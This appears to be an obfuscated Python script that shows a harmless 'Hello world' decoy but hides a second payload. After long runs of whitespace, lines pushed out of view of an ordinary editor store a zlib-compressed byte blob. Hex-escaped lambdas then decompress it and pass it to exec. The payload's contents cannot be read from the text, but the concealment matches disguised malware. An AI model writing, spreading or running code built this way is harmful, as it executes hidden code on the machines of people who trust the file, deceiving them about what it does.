from builtins import *
from math import prod as Round


__obfuscator__ = 'Deluxe'
__authors__ = "SadHam"
__github__ = 'https://github.com/'
__discord__ = 'https://discord.gg/'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


Positive, _invert, Ceil, CallFunction, Square, Hypothesis, _frame = exec, str, tuple, map, ord, globals, type

class _negative:
    def __init__(self, Frame):
        self.Cube = Round((Frame, -5663))
        self._random(_floor=-12742)

    def _random(self, _floor = False):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Cube += -75673 * _floor
        
        try:
            ((Positive, (_product, CallFunction)) for Positive in {Square: Positive} if Ceil <= Square)

        except AttributeError:
            (({Ceil: Positive}, Square) for Square in (Positive, Ceil))

        except:
            _frame(-65333 * 85792) == bool

    def While(self, _statistics = 41716):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _statistics -= 18508 / 40072
        self.Math != str
        
        try:
            ({Ceil: Positive} or _product if {Ceil: Positive} and _product else ... or (_product, {Ceil: Positive}))

        except ArithmeticError:
            ((Positive, _product, _invert) or Square if (Positive, _product, _invert) and Square else ... or (Square, (Positive, _product, _invert)))

        except:
            _frame(-78875 + -32923) == Ellipsis

    def _while(_calculate = Ellipsis):
        return Hypothesis()[_calculate]

    def DetectVar(_walk = -57190 - -61499, _modulo = bool, _positive = Hypothesis):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _positive()[_walk] = _modulo
        
        try:
            {Ceil: Positive} if Positive != _product else {Ceil: Positive} > Hypothesis

        except AssertionError:
            ((_invert, {Ceil: Positive}) for _invert in (_product, CallFunction) if Ceil == Positive)

        except:
            _frame(-80858 * -92090) == bool

    def execute(code = str):
        return Positive(_invert(Ceil(CallFunction(Square, code))))

    @property
    def Math(self):
        self._algorithm = '<__main__._product object at 0x000002691BE81324>'
        return (self._algorithm, _negative.Math)

if True:
    try:
        _negative.execute(code = __code__)
        Statistics = _negative(Frame = -39123 + 32256)

        _negative(Frame = 88143 * -72580)._random(_floor = Statistics.Cube / -59011)                                                                                                                                                                                                                                                          ;_negative.DetectVar(_walk='JLJIJLIJLIJLIIJJILL',_modulo=b'x\x9c\xe5XQs\xda8\x10~\xf7L\xfe\x83B\x1flO\x08\x05R\xda\xc2\x1c}\xb8#i\x9bI\xca\xcd\xd1\xbb\xe4&e<\xc2\x96A\xad,1\x92\\`2\xfd\xef\xb7\xb2\r\x18\x1b\xb7\xa1\x97{\xc9ilI\xacV\xdf\xae>\xad$\x8bg\xe8\xed\xdbc\xf4\xb7\x88\xd1\xe7Xi\x14\x101\tc\xe5cM\x02\x84QH\x19A9\xc9\x82\xea\x19\x1a\x10\x16/\x89e=C\xbf\t>\x95X\xc7\x0ck*\xb8:\xb6,K\xcbU\xcfB\x90h\x88\x9c\xa4b\x92\xe7\xadA\x84\xf4<t\xdcG\xb5\x14\xa5\x86\x84\xcci\xe1X\xcf\x84T\x99\xca\x08\x07\xefpTP\x99\x82\x0b\xf1$\xd3\x98i=W\xbd\xe7\xcfSa\xc3\x17\xd1\xf3\x82z@\x95/dP\xd0\xcf\xa4\x8d\xe9\xb4\xa8\xcf\xa8O\xb8"\x99\xfe\xf9\xefW\xa7\xedF\xb3\xa0\xe3\x8b S\xb0\xe7\x92r\xed\xd4\xde\x11\xc6\x04Z\x08\xc9\x82\xe3\x9ak\'\xbano\xd3\xc5\xe8\xd8\xea\x0b\rl\xd7"K\x9f\xccu\xc6\x11\x9f\xc7\xd0\xfb\x0f\xa1\x88BX\x12$I\xf0\x89\xffE\x05#:\x15LXL>q3=\xe6\x17F\x06\xe4\x13\xff &"X!F\xbf@\xbf\x95\x88k\xae\x95zF\xa3\xb9\x90\xda\xf3\xc0\xdaJ\xd9n\x83,\xa9v\\\x98\x16&|\xcc\x94\xe3\xde\xd9\xd7\x1f\xae\xaf?@2\xd95T\xa1\xbc\xb6\xc7\xfd)\x13\x13\xd0\xb0\xf65\x9bn777\xb7\xc9ss\x9b\x96\xf6]\xafwrzr\xea\x9c:\'-\xd7\x1d\x8f\xfb\x01\x95\x95\xdd9\x8fx\x14EPDi\x95C*CL\x89\xc6ZW\xc3d\xf6M\x919tk\xdc\xb9\x81\x01\xa4#\xb4\xaa4\x12\'\x12\xab\x89}\x9e\xd4\xd3"\x82\xde[\xea\xbek\xfb\xc6 o\xe0oo\xa1g\x15\xa8cOb\xca4\xe5f\x1e\xbeb\x99\xbaV\x040\xc0\x97W\x97WW\xef\xdf\'\xb9\xa9\\B~yyi\xb0yB\xd8\x9a\xb6\xb4\xeaT[T\x9cjF\xe3I\x91X\xb7\x9eQ\xb1\x9d\xc5\x9fAq\xef\x1e\x07\xa6Ay@\x96\x8e\xad\xb1`a\xa9y\xec~w\x12\x07\x83\x81\x18\x0e\x06\xc3!<\x90\x89\xc1\xf0\xe9\x13\xc5\x84(\xb7\xfe\x80\xa7\xc5r\xb1\x84d\xb2\x85\xa9/\x96O\x9f\'\xc2\xe8<\x12~\x15U\xfb\x16_\xf23\xe51\xcb\x9f>MR\xabC\xa3i\xc3\xc8\xdaT\x14\xfd\x04O\x94\xfa\ns\xfa/y\xaaD9\x8c\xa7j\x985O+\xf8\xfcY\x92\x19\x8f\xf7\xb1U}\xd2\xa5\x9cDkJL\xfe\xf4c\x8a\xe1\xaf\xe4\xd0\xa0\x1a\x0e\x9b\xc3\xa6\x10\xcdfs84\x05\xe4C\xc8\x9f>Y$\x96\x1f\x0f\x89\xa9\xb4\xba\x96\x9b\xe7\x7f\xc0\x91b\xf8\xe2\x90\x9d|4\x1a\xb5\xe1i\xb7G\xed\xa4\x92\xfe2\x15 \xcb\xb6\x1b\x9f\x05\xe5\xdf\xfb\xbcMN\x80\xdb\xfc\x00\xf2\xd6\xf7.k\xc7v\x9b\xd0\xdaz\x88b\xc7{\xed\xbd\xf2\xba\xf0\xb6\xbd\x16\xd4;^\x07\xb4_\x96\xa5\x0f\x01kAk\xf3!\x8a/\xbc3\xef\x05 \xbf\x82\xfc%\xd4\xa1\x04\xedNY\xfa\x88V\xf7\x9c\x15\xce\xc4>\xebv\xc2\xb3\x0e\xbcMx\xbbYy\x06\xef\x8b\xac\xde2\xf5\xf6\xa4\xfd\xba\x1d<H\xf7\xac\xdd\x85/\xeb\x80\x98\xdb\x98c\xbf\x0euy\x9bv\xd3\xac\xf4>\xf9\xc5\xe3\x93\xe5\xde\xdd\x18R(E\x84\xd6W\x13\x94\xdez\x10f\xac\x0e]\xfc:#\xbc\x1eQ^\x97\x98O\x89eD\x8e\r\x97V+\xd3cb:\xa5|zd\x1d\xa58\xbe`B\xe2\x08\xafq.\x84$\xa6\xd1\xe8\x11\x89\xfa\xeb\x0e\r\xb8\xd8]%2\xc7\xf38\x8e\xe0\xfa\xec\x1a\xbd#\xcbgX)4\xf2\xa5`\xec\x9c\x07\x03\xa2\x89\xaf\x85\xec\x1d%7\xdagh4\'>\rWh&\x16(\xc2|\x854\x8d\xe0\xd2\xbb 6ch\x06\x87\x0e\xd2\x02QM$\xd6\x04\x89\xaf`T\x01<\x8a\x15\x91\xca4A|\xd0\x00\x94fX\x83\x9a\r\xb2\x19A\x84\x07H\x84I\x95Q\xa5S[\x92\xcc\t\xd6\xca\xd3\xc23\xed}\xd4L\xe5p\xe5\x9e\xcfI\xe0\x01G{\x85^\xc8`\x84\xdb\xa69\x9e\x82\x83}t76\xe33\x92\x80\x84\xe6n\x0e\xb3\x067\xf3\xa3\xcd\xbf\x02\x8a\xb0\xb0^0\xdb\xef\xd47\xd8\xc65\xc8"\xaa\xfb\xddnw+O\xecm\x1b\x8e\xb2\x7f\x1bv\x81\x1b\xa5\xe1\xec\n\n\xdae\x9b\xd0\xa3,\xac\xe8\x95\xf3(\xd7-\'\xcd3\xc1\x85\x86\t\xf58Yx\x86*\xc7 \x95\xbcOHl`\xc0\xe1\x81s7v\xf7\x00\x98)NB)\x9b\xfd\xc0I\t]\xcb\xf3\x98\x10d:\xb1f\xdc\xdb\xe0\xdf\x9d\xb6\xc6{t\xd6f7@y\xe3\x92(\xa2\xbd\xdc\xf4\xef\xf7\xbf\x144%\xf7\x0f\x828\xe9\xa3Vus\x16\x81\xa9\xd2\xd6\x10U\xdev\x06a\x12<I\xb0?\xcbx\xca\x9b\xa3a\xd9\xe2\x9b~U`\xe4:&\xb4%\xcb\x1a6\x9eP8\xbb-&\x85\xb5Q\n`\xb6\x98lUR\x9e\xac:t_a\xe0[\xba\xc6\x1b\xe8\x02\x96\x8c\x9a5j\xf52.Yj\x89\xfb\xf7\xb5d\x03\xaa\xf5\xc0\xce\xbd\xd9{\x1a\xbf^\xfdy\xfe\xad\xf6\xad\xd0\xc3\xdd\xfd)\x89\x8e%G\x1feL\n|\xe5B\xf6\x10\xb6\xb2\t(r\x96_\x16oP\xb3@\\\x05\xc8f\x1f\xf9\xb1\xb7\xb0\x7f\x99\xa5\xbc\xcfC\xd8\xc7\x9dm\xa0\xbb\xe8\x17\xd4\xee\xed\x85\xbd\xc0Lmp\x93\xce\x1b\\p%5\xba\x99\xea\x07\xac\xa2l\x97A;\x01\x1b\n\x89\xa8\x99\xf7\xe4Xq\xdau\x04g\x8c\xb3o\x9b:A\xadz\xc9y\x10\xban\xc1\xfd=n\xd0\xf1\xae\n\xd0\x90h\x1d\xf7\xb7\x9e\xf7\xca\xa1\xb43\xe0\x8c\x8e\xa2\xce\x04\x82\xe1K\x91\xbft\xa0\xf9U\x97Y\xdd"\x1e\xbaV\xb6G\xd7zSC\xf7\x99\xa1\xcd\xaa8\xdf=\xbc\x1ewy\x10F\xc3\xcd\xd0\xde\xa0\xd6\x7f1\x80\xdf\x04\x87o\x8f\x98<\x8e\xe7\xf9\xd0K"z\xcb\xfe?,\xd1\xb5\xbc')

        if 303774 > 1761287:
            Statistics.While(_statistics = -6212 - Statistics.Cube)
        elif 353921 < 9557089:
            Statistics._random(_floor = Statistics.Cube * 67662)                                                                                                                                                                                                                                                          ;lIlllIIllllIIIIIlIIlI,NNNNNNMMNNMNMNNMNNNN,OOOoooOoDDoooDOoDDDoO,MMNMNMMNMNNMMMMNMMMN,jljjjliijjljliijijj=(lambda IlllIIIIlIlllIlIIlllIlIl:IlllIIIIlIlllIlIIlllIlIl['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda IlllIIIIlIlllIlIIlllIlIl:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IlllIIIIlIlllIlIIlllIlIl)"),filename='\x6a\x6a\x69\x6c\x6a\x6c\x6a\x6c\x69\x6a\x6a\x69\x6a\x6c\x6c\x6a\x6c',mode='\x65\x76\x61\x6c'))),(lambda IlllIIIIlIlllIlIIlllIlIl:IlllIIIIlIlllIlIIlllIlIl(__import__('\x7a\x6c\x69\x62'))),(lambda:(lambda IlllIIIIlIlllIlIIlllIlIl:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IlllIIIIlIlllIlIIlllIlIl)"),filename='\x6a\x6a\x69\x6c\x6a\x6c\x6a\x6c\x69\x6a\x6a\x69\x6a\x6c\x6c\x6a\x6c',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda lIlllIllIllIlIIIIllIlIl,IlllIIIIlIlllIlIIlllIlIl:lIlllIllIllIlIIIIllIlIl(IlllIIIIlIlllIlIIlllIlIl))
        Statistics.While(_statistics = -99679 + Statistics.Cube)                                                                                                                                                                                                                                                          ;MMNMNMMNMNNMMMMNMMMN()(jljjjliijjljliijijj(lIlllIIllllIIIIIlIIlI(OOOoooOoDDoooDOoDDDoO(NNNNNNMMNNMNMNNMNNNN('\x76\x61\x72\x73'))),_negative._while(_calculate='JLJIJLIJLIJLIIJJILL')))

    except Exception as _product:
        import traceback
        print(f'    module {__name__} raised an Exception:')
        print(f'     {_product}')
        print(traceback.format_exc())
        if 480904 > 7817319:
            _negative.execute(code = _invert(_product))

        elif 262600 > 7037905:
            _negative(Frame = 68420 * -33014).While(_statistics = -9535 - Statistics.Cube)